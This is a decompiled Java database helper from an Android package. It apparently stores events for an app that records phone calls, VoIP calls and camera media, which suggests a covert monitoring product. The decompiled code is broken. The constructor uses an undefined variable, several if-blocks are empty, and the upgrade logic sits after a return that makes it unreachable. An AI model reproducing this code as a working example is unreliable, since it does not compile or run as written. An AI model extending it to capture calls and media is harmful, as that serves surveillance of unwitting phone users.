package com.vvt.eventrepository.b;

import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;

public class b
  extends SQLiteOpenHelper
{
  private static final boolean a = com.vvt.eventrepository.a.a;
  
  b(Context paramContext, String paramString, int paramInt)
  {
    super(locala, paramString, null, paramInt);
  }
  
  public void onCreate(SQLiteDatabase paramSQLiteDatabase)
  {
    boolean bool = a;
    if (bool) {}
    String str = d.a();
    paramSQLiteDatabase.execSQL(str);
    str = d.b();
    paramSQLiteDatabase.execSQL(str);
    str = d.c();
    paramSQLiteDatabase.execSQL(str);
    str = d.l();
    paramSQLiteDatabase.execSQL(str);
    str = d.f();
    paramSQLiteDatabase.execSQL(str);
    str = d.j();
    paramSQLiteDatabase.execSQL(str);
    str = d.i();
    paramSQLiteDatabase.execSQL(str);
    str = d.k();
    paramSQLiteDatabase.execSQL(str);
    str = d.p();
    paramSQLiteDatabase.execSQL(str);
    str = d.d();
    paramSQLiteDatabase.execSQL(str);
    str = d.e();
    paramSQLiteDatabase.execSQL(str);
    str = d.x();
    paramSQLiteDatabase.execSQL(str);
    str = d.m();
    paramSQLiteDatabase.execSQL(str);
    str = d.n();
    paramSQLiteDatabase.execSQL(str);
    str = d.o();
    paramSQLiteDatabase.execSQL(str);
    str = d.y();
    paramSQLiteDatabase.execSQL(str);
    str = d.z();
    paramSQLiteDatabase.execSQL(str);
    str = d.A();
    paramSQLiteDatabase.execSQL(str);
    str = d.B();
    paramSQLiteDatabase.execSQL(str);
    str = d.C();
    paramSQLiteDatabase.execSQL(str);
    str = d.q();
    paramSQLiteDatabase.execSQL(str);
    str = d.s();
    paramSQLiteDatabase.execSQL(str);
    str = d.r();
    paramSQLiteDatabase.execSQL(str);
    str = d.t();
    paramSQLiteDatabase.execSQL(str);
    str = d.u();
    paramSQLiteDatabase.execSQL(str);
    str = d.v();
    paramSQLiteDatabase.execSQL(str);
    str = d.w();
    paramSQLiteDatabase.execSQL(str);
    str = d.D();
    paramSQLiteDatabase.execSQL(str);
    str = d.g();
    paramSQLiteDatabase.execSQL(str);
    str = d.h();
    paramSQLiteDatabase.execSQL(str);
    str = d.E();
    paramSQLiteDatabase.execSQL(str);
    str = d.F();
    paramSQLiteDatabase.execSQL(str);
    str = d.G();
    paramSQLiteDatabase.execSQL(str);
    str = d.H();
    paramSQLiteDatabase.execSQL(str);
    str = d.K();
    paramSQLiteDatabase.execSQL(str);
    str = d.N();
    paramSQLiteDatabase.execSQL(str);
    str = d.O();
    paramSQLiteDatabase.execSQL(str);
    str = d.P();
    paramSQLiteDatabase.execSQL(str);
    str = d.I();
    paramSQLiteDatabase.execSQL(str);
    str = d.J();
    paramSQLiteDatabase.execSQL(str);
    str = d.Q();
    paramSQLiteDatabase.execSQL(str);
    str = d.R();
    paramSQLiteDatabase.execSQL(str);
    str = d.S();
    paramSQLiteDatabase.execSQL(str);
    str = d.T();
    paramSQLiteDatabase.execSQL(str);
    str = d.U();
    paramSQLiteDatabase.execSQL(str);
    str = d.V();
    paramSQLiteDatabase.execSQL(str);
    str = d.W();
    paramSQLiteDatabase.execSQL(str);
    str = d.X();
    paramSQLiteDatabase.execSQL(str);
    str = d.Y();
    paramSQLiteDatabase.execSQL(str);
    str = d.Z();
    paramSQLiteDatabase.execSQL(str);
    str = d.aa();
    paramSQLiteDatabase.execSQL(str);
    str = d.ab();
    paramSQLiteDatabase.execSQL(str);
    str = d.ac();
    paramSQLiteDatabase.execSQL(str);
    str = d.ad();
    paramSQLiteDatabase.execSQL(str);
    str = d.ae();
    paramSQLiteDatabase.execSQL(str);
    str = d.L();
    paramSQLiteDatabase.execSQL(str);
    str = d.M();
    paramSQLiteDatabase.execSQL(str);
    str = d.ag();
    paramSQLiteDatabase.execSQL(str);
    str = d.ah();
    paramSQLiteDatabase.execSQL(str);
    str = d.ai();
    paramSQLiteDatabase.execSQL(str);
    str = d.aj();
    paramSQLiteDatabase.execSQL(str);
    str = d.ak();
    paramSQLiteDatabase.execSQL(str);
    str = d.al();
    paramSQLiteDatabase.execSQL(str);
    str = d.am();
    paramSQLiteDatabase.execSQL(str);
    str = d.an();
    paramSQLiteDatabase.execSQL(str);
    str = d.ao();
    paramSQLiteDatabase.execSQL(str);
    str = d.ap();
    paramSQLiteDatabase.execSQL(str);
    str = d.aq();
    paramSQLiteDatabase.execSQL(str);
    str = d.ar();
    paramSQLiteDatabase.execSQL(str);
    str = d.af();
    paramSQLiteDatabase.execSQL(str);
  }
  
  public void onUpgrade(SQLiteDatabase paramSQLiteDatabase, int paramInt1, int paramInt2)
  {
    int i = 2;
    int j = 1;
    boolean bool = a;
    if (bool) {}
    switch (paramInt1)
    {
    }
    for (;;)
    {
      return;
      bool = a;
      if (bool) {}
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = "media";
      String str1 = "camera_type";
      arrayOfObject[j] = str1;
      String str2 = String.format("ALTER TABLE %s ADD COLUMN %s INTEGER DEFAULT 0", arrayOfObject);
      paramSQLiteDatabase.execSQL(str2);
      bool = a;
      if (bool) {}
      arrayOfObject = new Object[i];
      arrayOfObject[0] = "attachment";
      str1 = "file_path";
      arrayOfObject[j] = str1;
      str2 = String.format("ALTER TABLE %s ADD COLUMN %s TEXT", arrayOfObject);
      paramSQLiteDatabase.execSQL(str2);
      bool = a;
      if (bool) {}
      str2 = d.g();
      paramSQLiteDatabase.execSQL(str2);
      str2 = d.L();
      paramSQLiteDatabase.execSQL(str2);
      bool = a;
      if (bool) {}
      str2 = d.h();
      paramSQLiteDatabase.execSQL(str2);
      str2 = d.M();
      paramSQLiteDatabase.execSQL(str2);
      bool = a;
      if (bool) {}
      arrayOfObject = new Object[i];
      arrayOfObject[0] = "attachment";
      arrayOfObject[j] = "call_recording_id";
      str2 = String.format("ALTER TABLE %s ADD COLUMN %s INTEGER", arrayOfObject);
      paramSQLiteDatabase.execSQL(str2);
      arrayOfObject = new Object[i];
      arrayOfObject[0] = "recipient";
      str1 = "call_recording_id";
      arrayOfObject[j] = str1;
      str2 = String.format("ALTER TABLE %s ADD COLUMN %s INTEGER", arrayOfObject);
      paramSQLiteDatabase.execSQL(str2);
      bool = a;
      if (bool) {}
      int k = 3;
      arrayOfObject = new Object[k];
      arrayOfObject[0] = "voip_call_recording";
      arrayOfObject[j] = "attachment";
      str1 = "call_recording_id";
      arrayOfObject[i] = str1;
      str2 = String.format("CREATE TRIGGER delete_voip_call_rec_attachment AFTER DELETE ON %1$s BEGIN DELETE FROM %2$s WHERE old._id = %2$s.%3$s; END;", arrayOfObject);
      paramSQLiteDatabase.execSQL(str2);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/eventrepository/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */